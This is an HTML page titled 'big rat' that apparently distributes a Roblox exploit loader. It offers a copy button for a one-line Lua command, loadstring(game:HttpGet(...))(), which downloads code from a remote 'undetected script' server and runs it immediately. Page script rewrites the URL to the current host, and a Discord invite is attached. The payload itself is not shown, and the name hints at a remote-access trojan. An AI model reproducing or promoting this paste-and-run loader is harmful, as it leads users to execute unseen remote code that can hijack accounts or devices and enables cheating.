<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>big rat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-color: #ffffff; 
            font-family: "Arial", sans-serif; 
            color: #000000; 
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 50px;
        }

        .big-rat {
            width: 600px; /* Enormous */
            max-width: 90vw;
            height: auto;
            margin-bottom: 20px;
        }

        .copy-container {
            text-align: center;
            width: 100%;
            max-width: 600px;
        }

        .script-display {
            background: #f0f0f0;
            border: 1px solid #ccc;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
            margin-bottom: 15px;
            display: block;
        }

        .classic-button {
            background: #e1e1e1;
            border: 1px solid #707070;
            padding: 8px 24px;
            font-size: 16px;
            cursor: pointer;
            color: black;
        }

        .classic-button:hover {
            background: #d5d5d5;
            border-color: #000;
        }

        .classic-button:active {
            background: #afafaf;
        }

        .discord-link {
            margin-top: 40px;
            color: blue;
            text-decoration: underline;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <h1 style="font-size: 48px; font-weight: bold; margin-bottom: 10px;">big rat</h1>

    <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="big-rat" alt="RAT">

    <div class="copy-container">
        <code class="script-display" id="script-path">
            loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()
        </code>
        
        <button class="classic-button" onclick="copyScript()">
            Copy Script
        </button>
    </div>

    <a href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="discord-link">
        discord server
    </a>

    <script>
        // Update URL to match current host automatically
        const currentUrl = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
        document.getElementById('script-path').innerText = currentUrl;

        function copyScript() {
            const text = document.getElementById('script-path').innerText;
            navigator.clipboard.writeText(text);
            alert("copied");
        }
    </script>

</body>
</html>
